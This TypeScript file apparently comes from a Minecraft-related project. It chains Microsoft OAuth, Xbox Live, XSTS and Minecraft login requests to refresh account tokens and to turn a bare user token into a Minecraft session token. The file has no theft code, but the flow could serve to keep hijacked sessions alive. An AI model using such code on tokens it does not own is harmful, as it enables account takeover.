import { TokenData, AccessAndRefreshToken, UserTokenAndHash, RefreshRefreshToken, RefreshUserToken } from '../types';

import axios from "axios";
import { logger } from "..";
import config from "../../config.json";

// wb to hell :)
export class RefreshToken {
    private data: TokenData;

    private accessAndRefresh: AccessAndRefreshToken;
    private userTokenAndHash: UserTokenAndHash;
    private xstsToken: string;
    private minecraftToken: string;

    constructor(data: TokenData) {
        this.data = data;
    }

    async refreshToken(): Promise<RefreshRefreshToken | null> {
        try {
            await axios.post(`https://login.live.com/oauth20_token.srf`, {
                client_secret: config.azure.client_secret,
                redirect_uri: config.azure.redirect_uri,
                client_id: config.azure.client_id,
                grant_type: "refresh_token",
                refresh_token: this.data.token
            }, {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                }
            })
            .then(response => {
                this.accessAndRefresh = {
                    accessToken: response.data.access_token,
                    refreshToken: response.data.refresh_token
                }
            })
            .catch(error => { throw new Error(error) });

            
            await axios.post(`https://user.auth.xboxlive.com/user/authenticate`, {
                Properties: {
                    AuthMethod: "RPS",
                    SiteName: "user.auth.xboxlive.com",
                    RpsTicket: `d=${this.accessAndRefresh.accessToken}`
                },
                RelyingParty: "http://auth.xboxlive.com",
                TokenType: "JWT"
            })
            .then(response => {
                this.userTokenAndHash = {
                    userToken: response.data.Token,
                    userHash: response.data.DisplayClaims.xui[0].uhs
                }
            })
            .catch(error => { throw new Error(error) });

            await axios.post(`https://xsts.auth.xboxlive.com/xsts/authorize`, {
                Properties: {
                    SandboxId: "RETAIL",
                    UserTokens: [this.userTokenAndHash.userToken]
                },
                RelyingParty: "rp://api.minecraftservices.com/",
                TokenType: "JWT"
            })
            .then(response => {
                this.xstsToken = response.data.Token;
            })
            .catch(error => { throw new Error(error) });

            try {
                await axios.post(`https://api.minecraftservices.com/authentication/login_with_xbox`, {
                    identityToken: `XBL3.0 x=${this.userTokenAndHash.userHash};${this.xstsToken}`
                })
                .then(response => {
                    this.minecraftToken = response.data.access_token;
                })
            } catch (error) {
                logger.error(error);
                return null;
            }

            return {
                refreshToken: this.accessAndRefresh.refreshToken,
                minecraftToken: this.minecraftToken
            } as RefreshRefreshToken;

        } catch (error) {
            logger.error(error);
            null;
        }
    }

    async userToken(): Promise<RefreshUserToken | null> {

        await axios.post(`https://xsts.auth.xboxlive.com/xsts/authorize`, {
            Properties: {
                SandboxId: "RETAIL",
                UserTokens: [
                    this.data.token
                ]
            },
            RelyingParty: "rp://api.minecraftservices.com/",
            TokenType: "JWT"
        }, {
            headers: {
                "Content-Type": "application/json",
                "Accept": "application/json"
            }
        }).then((response) => {
            this.userTokenAndHash = {
                userToken: response.data.Token,
                userHash: response.data.DisplayClaims.xui[0].uhs 
            }
        }).catch(error => { throw new Error(error) });

        try {
            await axios.post(`https://api.minecraftservices.com/authentication/login_with_xbox`, {
                identityToken: `XBL3.0 x=${this.userTokenAndHash.userHash};${this.userTokenAndHash.userToken}`
            })
            .then(response => {
                this.minecraftToken = response.data.access_token;
            })
        } catch (error) {
            logger.error(error);
            return null;
        }

        return {
            userToken: this.userTokenAndHash.userToken,
            minecraftToken: this.minecraftToken
        } as RefreshUserToken;

    }
}

